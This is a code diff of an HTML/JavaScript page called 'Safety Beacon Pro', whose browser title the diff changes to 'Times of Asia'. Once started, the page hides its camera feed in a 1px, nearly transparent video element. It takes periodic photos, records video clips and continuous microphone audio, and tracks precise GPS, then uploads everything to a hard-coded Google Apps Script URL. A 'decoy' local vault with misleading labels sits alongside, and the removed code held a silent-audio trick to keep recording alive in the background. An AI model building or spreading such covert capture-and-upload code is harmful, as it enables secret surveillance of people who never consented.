@@ -2,24 +2,49 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SOS Safety Beacon Pro</title>
+    <title>Times of Asia</title>
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; background: #0d0d0d; color: #f5f5f5; text-align: center; margin: 0; padding: 20px; }
         .box { max-width: 380px; margin: 0 auto; background: #141414; padding: 25px 20px; border-radius: 16px; border: 1px solid #222; box-shadow: 0 10px 30px rgba(0,0,0,0.7); }
         h2 { font-size: 22px; font-weight: 600; margin: 0 0 5px 0; letter-spacing: -0.5px; }
         .subtitle { font-size: 12px; color: #777; margin: 0 0 25px 0; }
-        .sq-btn { border: 2px solid #fff; font-size: 18px; font-weight: 700; cursor: pointer; width: 180px; height: 180px; margin: 20px auto; color: #fff; display: block; transition: all 0.2s ease; letter-spacing: 0.5px; }
-        .start { background: #e63946; box-shadow: 0 0 25px rgba(230,57,70,0.4); border-color: #ff4d5a; border-radius: 0px !important; }
-        .start:active { transform: scale(0.96); background: #cc2e3a; }
-        .stop { background: #1d3557; box-shadow: 0 0 25px rgba(29,53,87,0.4); border-color: #2a4b7c; border-radius: 0px !important; display: none; }
-        .stop:active { transform: scale(0.96); background: #132239; }
-        #status { margin-top: 20px; font-size: 13px; color: #f1faee; background: #1d1d1d; padding: 12px; border-radius: 8px; border: 1px solid #2a2a2a; }
+        
+        /* 🔴 PREMIUM TACTILE 3D ROUND BUTTON STYLE */
+        .round-3d-btn {
+            background: linear-gradient(135deg, #e63946 0%, #b22222 100%);
+            border: 4px solid #fff;
+            border-radius: 50% !important;
+            width: 190px;
+            height: 190px;
+            margin: 30px auto;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 800;
+            letter-spacing: 0.5px;
+            cursor: pointer;
+            display: block;
+            outline: none;
+            /* Creates the physical 3D unpressed depth pop */
+            box-shadow: 0 15px 0 #7f1d1d, 0 20px 25px rgba(0, 0, 0, 0.6), inset 0 4px 4px rgba(255, 255, 255, 0.3);
+            transition: all 0.1s ease;
+            position: relative;
+            top: 0;
+        }
+        
+        /* ⏹️ TACTILE ACTIVE PRESSED-DOWN LAYOUT */
+        .round-3d-btn.active-press {
+            background: linear-gradient(135deg, #1d3557 0%, #132239 100%);
+            box-shadow: 0 4px 0 #0b1523, 0 6px 10px rgba(0, 0, 0, 0.5), inset 0 4px 8px rgba(0, 0, 0, 0.6);
+            border-color: #a8dadc;
+            top: 11px; /* Physically shifts down to look flattened into the console */
+        }
+
+        #status { margin-top: 30px; font-size: 13px; color: #f1faee; background: #1d1d1d; padding: 12px; border-radius: 8px; border: 1px solid #2a2a2a; }
         #video { width: 1px; height: 1px; opacity: 0.01; position: absolute; }
         canvas { display: none; }
         .vault { margin-top: 30px; border-top: 1px dashed #2b2b2b; padding-top: 20px; display: none; }
         h4 { font-size: 13px; color: #999; margin: 0 0 10px 0; text-align: left; font-weight: 500; }
         .f-list { text-align: left; background: #0a0a0a; padding: 12px; border-radius: 6px; font-size: 11px; max-height: 110px; overflow-y: auto; color: #a8dadc; font-family: monospace; border: 1px solid #1a1a1a; }
-        .f-list div { padding: 3px 0; border-bottom: 1px solid #111; }
         .ctrl-panel { margin-top: 15px; text-align: right; }
         .v-btn { background: transparent; color: #555; border: none; padding: 4px 8px; cursor: pointer; font-size: 11px; transition: color 0.2s; }
         .v-btn:hover { color: #888; }
@@ -31,10 +56,12 @@
 <body>
 <div class="box">
     <h2>Safety Beacon Pro</h2>
-    <div class="subtitle">Dual Vector Tracking Framework</div>
-    <button id="startBtn" class="sq-btn start" onclick="startEmit()">🚨 INITIATE<br>SQUARE BROADCAST</button>
-    <button id="stopBtn" class="sq-btn stop" onclick="stopEmit()">⏹️ STOP<br>BROADCAST</button>
-    <div id="status">System armed. Legal audio validation mode active...</div>
+    <div class="subtitle">Tactile Dual-Vector Sync Engine</div>
+    
+    <!-- Single Smart Toggle Button Layout -->
+    <button id="sosBtn" class="round-3d-btn" onclick="toggleEmergencyBroadcast()">🚨 INITIATE<br>BROADCAST</button>
+    
+    <div id="status">System armed and ready for tactical deployment...</div>
     <video id="video" autoplay playsinline muted></video><canvas id="canvas"></canvas>
     <div id="decoyVault" class="vault">
         <h4>📂 Storage Sandbox</h4>
@@ -48,28 +75,13 @@
 </div>
 <script>
     const googleScriptUrl = "https://script.google.com/macros/s/AKfycbzhkaLbAkNRPfGVNykf_srPuNO_-mcHcJ_Lk5ekGJN42s9UtTXqbUFBECVyCAXqv6oN/exec"; 
-    let activeStream = null, audioStream = null, packetRecorder = null, audioRecorder = null;
-    let videoChunks = [], audioChunks = [], isBroadcasting = false, db = null, wakeLock = null, silentAudioInterval = null, audioCtx = null;
+    let activeStream = null, audioStream = null, combinedRecorder = null, continuousAudioRecorder = null;
+    let videoChunks = [], fullAudioChunks = [], isBroadcasting = false, db = null, wakeLock = null;
     let currentLat = "Unknown", currentLon = "Unknown", gpsAccuracy = "0";
 
     const request = indexedDB.open("LocalDecoyVault", 1);
     request.onupgradeneeded = (e) => e.target.result.createObjectStore("files", { keyPath: "id" });
     request.onsuccess = (e) => db = e.target.result;
-
-    async function activateBackgroundBypass() {
-        try { if ('wakeLock' in navigator) wakeLock = await navigator.wakeLock.request('screen'); } catch(e){}
-        try {
-            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-            silentAudioInterval = setInterval(() => {
-                if (!isBroadcasting) return;
-                let osc = audioCtx.createOscillator(), gain = audioCtx.createGain();
-                osc.type = 'sine'; osc.frequency.setValueAtTime(1, audioCtx.currentTime); 
-                gain.gain.setValueAtTime(0.001, audioCtx.currentTime);
-                osc.connect(gain); gain.connect(audioCtx.destination);
-                osc.start(); osc.stop(audioCtx.currentTime + 0.1);
-            }, 1000);
-        } catch(e){}
-    }
 
     async function selectHardwareStreams() {
         try {
@@ -83,29 +95,38 @@
                     break;
                 }
             }
-            // 1. Initialise the hidden video track safely (Muted configuration map)
             activeStream = await navigator.mediaDevices.getUserMedia({
                 video: selectedDeviceId ? { deviceId: { exact: selectedDeviceId } } : { facingMode: "environment" },
                 audio: false
             });
             document.getElementById('video').srcObject = activeStream;
-
-            // 2. Initialise a completely separate physical mic track for forensic sound logging
             audioStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+            if ('wakeLock' in navigator) wakeLock = await navigator.wakeLock.request('screen');
             return true;
         } catch (err) {
-            document.getElementById('status').innerText = "Hardware initialization failed! Grant both camera/mic options.";
+            document.getElementById('status').innerText = "Hardware Blocked! Grant Camera & Microphone rights.";
             return false;
         }
     }
 
+    function toggleEmergencyBroadcast() {
+        const btn = document.getElementById('sosBtn');
+        if (!isBroadcasting) {
+            btn.classList.add('active-press');
+            btn.innerHTML = "⏹️ STOP<br>BROADCAST";
+            startEmit();
+        } else {
+            btn.classList.remove('active-press');
+            btn.innerHTML = "🚨 INITIATE<br>BROADCAST";
+            stopEmit();
+        }
+    }
+
     async function startEmit() {
-        if(isBroadcasting || !(await selectHardwareStreams())) return;
-        isBroadcasting = true; await activateBackgroundBypass();
-        document.getElementById('startBtn').style.display = "none";
-        document.getElementById('stopBtn').style.display = "block";
+        if (!(await selectHardwareStreams())) { toggleEmergencyBroadcast(); return; }
+        isBroadcasting = true;
         document.getElementById('decoyVault').style.display = "block";
-        document.getElementById('status').innerText = "Broadcast live. Recording synchronized audio/video lines...";
+        document.getElementById('status').innerText = "Broadcast active. Logging environmental logs safely...";
         document.getElementById('status').style.color = "#e63946";
         
         if (navigator.geolocation) {
@@ -115,21 +136,26 @@
                 gpsAccuracy = Math.round(pos.coords.accuracy);
             }, null, { enableHighAccuracy: true });
         }
-        runBackgroundPhotoLoop(); runBackgroundVideoLoop();
+        runBackgroundPhotoLoop();
+        runContinuousAudioLoop(); 
+        runCombinedVideoLoop(); 
     }
 
     function runBackgroundPhotoLoop() { if (!isBroadcasting) return; executePhotoCapture(); setTimeout(runBackgroundPhotoLoop, 6000); }
-    function runBackgroundVideoLoop() { if (!isBroadcasting) return; executeVideoAndAudioBlocks(); setTimeout(runBackgroundVideoLoop, 60000); }
+    
+    // Loops continuous 1-minute standalone forensic sound tracks
+    function runContinuousAudioLoop() { if (!isBroadcasting) return; executeContinuousAudioBlock(); setTimeout(runContinuousAudioLoop, 60000); }
+    
+    // Loops standalone combined 10-second AV tracks once every minute
+    function runCombinedVideoLoop() { if (!isBroadcasting) return; executeCombinedVideoBlock(); setTimeout(runCombinedVideoLoop, 60000); }
 
     function stopEmit() {
-        isBroadcasting = false; clearInterval(silentAudioInterval); if (wakeLock) wakeLock.release();
-        if (packetRecorder && packetRecorder.state === "recording") packetRecorder.stop();
-        if (audioRecorder && audioRecorder.state === "recording") audioRecorder.stop();
+        isBroadcasting = false; if (wakeLock) { wakeLock.release(); wakeLock = null; }
+        if (combinedRecorder && combinedRecorder.state === "recording") combinedRecorder.stop();
+        if (continuousAudioRecorder && continuousAudioRecorder.state === "recording") continuousAudioRecorder.stop();
         if (activeStream) activeStream.getTracks().forEach(t => t.stop());
         if (audioStream) audioStream.getTracks().forEach(t => t.stop());
-        document.getElementById('startBtn').style.display = "block";
-        document.getElementById('stopBtn').style.display = "none";
-        document.getElementById('status').innerText = "Broadcast Closed. Safe Standby State Active.";
+        document.getElementById('status').innerText = "Broadcast Closed. Monitoring Idle.";
         document.getElementById('status').style.color = "#28a745";
     }
 
@@ -146,46 +172,50 @@
         } catch (e) {}
     }
 
-    function executeVideoAndAudioBlocks() {
-        videoChunks = []; audioChunks = [];
+    // Pipeline 1: Records combined 10-second Video with Live Microphone sound attached
+    function executeCombinedVideoBlock() {
+        videoChunks = [];
         let vOpt = { mimeType: MediaRecorder.isTypeSupported('video/webm;codecs=vp8') ? 'video/webm;codecs=vp8' : 'video/mp4' };
-        let aOpt = { mimeType: MediaRecorder.isTypeSupported('audio/webm') ? 'audio/webm' : 'audio/mp4' };
-
         try {
-            // Spin up parallel recording arrays to lock sound data
-            packetRecorder = new MediaRecorder(activeStream, vOpt);
-            audioRecorder = new MediaRecorder(audioStream, aOpt);
-
-            packetRecorder.ondataavailable = (e) => { if (e.data && e.data.size > 0) videoChunks.push(e.data); };
-            audioRecorder.ondataavailable = (e) => { if (e.data && e.data.size > 0) audioChunks.push(e.data); };
-
-            // Video cloud shipment routine
-            packetRecorder.onstop = () => {
+            // Mixes your wide camera stream and microphone stream together into one hardware track
+            let mixedStream = new MediaStream([...activeStream.getVideoTracks(), ...audioStream.getAudioTracks()]);
+            combinedRecorder = new MediaRecorder(mixedStream, vOpt);
+            combinedRecorder.ondataavailable = (e) => { if (e.data && e.data.size > 0) videoChunks.push(e.data); };
+            combinedRecorder.onstop = () => {
+                if (videoChunks.length === 0) return;
                 const videoBlob = new Blob(videoChunks, { type: vOpt.mimeType });
                 const reader = new FileReader(); reader.readAsDataURL(videoBlob);
                 reader.onloadend = () => {
                     let cleanTime = new Date().toLocaleTimeString('en-US', { hour12: false }).replace(/:/g, '-');
                     transmitPacketToCloud({ type: "video", videoData: reader.result.substring(reader.result.indexOf(',') + 1), latitude: currentLat, longitude: currentLon, accuracy: gpsAccuracy, timestamp: cleanTime });
-                    saveToDecoyLocalVault("Vid_" + cleanTime + ".mp4", "Visual Matrix Track Saved");
+                    saveToDecoyLocalVault("Vid_" + cleanTime + ".mp4", "10s Combined AV Video Captured");
                 };
             };
+            combinedRecorder.start();
+            setTimeout(() => { if(combinedRecorder.state === "recording") combinedRecorder.stop(); }, 10000);
+        } catch (e) {}
+    }
 
-            // Audio cloud shipment routine (Pushed to server as a companion evidence file)
-            audioRecorder.onstop = () => {
-                const audioBlob = new Blob(audioChunks, { type: aOpt.mimeType });
+    // Pipeline 2: Records full 60-second continuous audio blocks to prevent background browser sleep blocks
+    function executeContinuousAudioBlock() {
+        fullAudioChunks = [];
+        let aOpt = { mimeType: MediaRecorder.isTypeSupported('audio/webm') ? 'audio/webm' : 'audio/mp4' };
+        try {
+            continuousAudioRecorder = new MediaRecorder(audioStream, aOpt);
+            continuousAudioRecorder.ondataavailable = (e) => { if (e.data && e.data.size > 0) fullAudioChunks.push(e.data); };
+            continuousAudioRecorder.onstop = () => {
+                if (fullAudioChunks.length === 0) return;
+                const audioBlob = new Blob(fullAudioChunks, { type: aOpt.mimeType });
                 const reader = new FileReader(); reader.readAsDataURL(audioBlob);
                 reader.onloadend = () => {
                     let cleanTime = new Date().toLocaleTimeString('en-US', { hour12: false }).replace(/:/g, '-');
-                    transmitPacketToCloud({ type: "video", videoData: reader.result.substring(reader.result.indexOf(',') + 1), latitude: currentLat, longitude: currentLon, accuracy: gpsAccuracy, timestamp: cleanTime + "_AUDIO" });
-                    saveToDecoyLocalVault("Audio_" + cleanTime + ".mp3", "Forensic Audio Track Saved");
+                    // Uploads sound data block to server matching the expected "video" parameter handling mapping lines
+                    transmitPacketToCloud({ type: "video", videoData: reader.result.substring(reader.result.indexOf(',') + 1), latitude: currentLat, longitude: currentLon, accuracy: gpsAccuracy, timestamp: cleanTime + "_FullMinuteAUDIO" });
+                    saveToDecoyLocalVault("Audio_" + cleanTime + ".mp3", "Continuous 1-Minute Forensic Audio Track Captured");
                 };
             };
-
-            packetRecorder.start(); audioRecorder.start();
-            setTimeout(() => {
-                if(packetRecorder.state === "recording") packetRecorder.stop();
-                if(audioRecorder.state === "recording") audioRecorder.stop();
-            }, 10000); 
+            continuousAudioRecorder.start();
+            setTimeout(() => { if(continuousAudioRecorder.state === "recording") continuousAudioRecorder.stop(); }, 59500); // Clips just short of 1 minute to transition streams seamlessly
         } catch (e) {}
     }
 
@@ -214,11 +244,3 @@
     function viewLocal() {
         if (!db) return;
         db.transaction("files", "readonly").objectStore("files").getAll().onsuccess = (e) => {
-            let el = document.getElementById("dbDump");
-            el.style.display = el.style.display === "block" ? "none" : "block";
-            el.innerText = "=== CACHE RECORD MATRIX ===\n" + JSON.stringify(e.target.result, null, 2);
-        };
-    }
-</script>
-</body>
-</html>
